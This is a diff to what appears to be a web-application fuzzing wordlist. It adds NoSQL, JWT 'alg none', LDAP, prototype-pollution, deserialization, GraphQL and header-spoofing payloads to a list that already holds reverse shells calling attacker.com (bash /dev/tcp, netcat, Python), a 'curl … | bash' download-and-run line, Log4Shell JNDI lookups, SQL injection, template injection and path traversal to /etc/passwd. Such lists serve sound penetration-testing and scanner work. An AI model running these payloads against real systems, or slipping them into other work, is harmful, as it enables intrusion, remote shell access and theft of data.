@@ -4,10 +4,12 @@ ${${env:ENV_NAME}}
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
 ${{7*7}}
 ${7*7}
+{"$gt": ""}
 $(id)
 ${jndi:dns://attacker.com/a}
 ${jndi:ldap://attacker.com/a}
 ${jndi:rmi://attacker.com/a}
+{"$ne": null}
 $(whoami)
 %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 %3Cscript%3Ealert(1)%3C/script%3E
@@ -19,9 +21,12 @@ $(whoami)
 @{{7*7}}
 [[7*7]]
 {{7*7}}
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: *
 admin' #
 admin'--
 admin'/*
+admin' || '1'=='1
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>
 <a href="javascript:alert(1)">Click Me</a>
 ' AND 1=2 UNION SELECT 1,2,3,4,5--
@@ -30,12 +35,15 @@ admin'/*
 <audio src=x onerror=alert(1)>
 /.bash_history
 ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
 body { background: url("javascript:alert(1)"); }
 <body onload=alert(1)>
 ; cat /etc/passwd
 {{ ''.__class__.__mro__[2].__subclasses__() }}
+*)(cn=*)
 {{config}}
 /config.php
+constructor.prototype.test=test
 count(/child::node())
 count(//*[position()=1])
 ; curl http://attacker.com/shell.sh | bash
@@ -63,6 +71,8 @@ eval("echo 123");
 <!--#exec cmd="whoami" -->
 '; EXEC xp_cmdshell('whoami');--
 expect://id
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
 file:///c:/windows/win.ini
 file:///etc/hosts
 file:///etc/passwd
@@ -119,6 +129,8 @@ javascript:prompt(1)
 <math><mtext><option><annotation><legend><path><svg><rect><foreignObject><p><table><script>alert(1)</script>
 {__name__=~".+"}
 ; nc -e /bin/sh attacker.com 4444
+# --- NOSQL, JWT, LDAP, CORS ---
+O:8:"Exploit":1:{s:4:"data";s:4:"test";}
 <object data="javascript:alert(1)">
 " OR "1"="1
 " OR 1=1#
@@ -145,6 +157,7 @@ javascript:prompt(1)
 ' OR 2+2=4--
 ' OR 3*3=9--
 ' OR 'a'='a'--
+Origin: https://attacker.com
 ' OR Name LIKE '%'
 ' OR SLEEP(10)--
 " OR SLEEP(5)--
@@ -155,13 +168,17 @@ phpinfo();
 /proc/self/cmdline
 /proc/self/environ
 /proc/version
+__proto__[test]=test
 ; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+query { user { password } }
 # --- RCE & CMD INJECTION ---
 {{request.application.__self__._mw_app.settings}}
 \r\nBcc: victim@domain.com
 \r\nContent-Type: text/html\r\n\r\n<h1>Hacked</h1>
 \r\nSubject: Spoofed
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcG
 #{root}
+{__schema{types{name}}}
 "><script>alert(1)</script>
 '><script>alert(1)</script>
 <script>alert(1)</script>
@@ -185,6 +202,7 @@ phpinfo();
 <svg/onload=alert(1)>
 <svg/onload=confirm(1)>
 <svg><script>alert(1)</script></svg>
+*)(&(uid=admin))
 ; uname -a
 | uname -a
 ' UNION SELECT 1,2,3--
@@ -198,7 +216,6 @@ phpinfo();
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ' UNION SELECT user(),NULL--
 ' UNION SELECT @@version,NULL--
-up{job=".*"}
 /var/log/apache2/access.log
 /var/log/auth.log
 /var/log/httpd/access.log
@@ -216,5 +233,8 @@ where: "id = 1 OR 1=1"
 | whoami
 ..\..\..\..\..\..\windows\win.ini
 /wp-config.php
+X-Forwarded-For: 127.0.0.1
 <xmp><p title="</xmp><svg/onload=alert(1)>">
+X-Original-URL: /admin
+X-Remote-IP: 127.0.0.1
 # --- XSS PAYLOADS ---
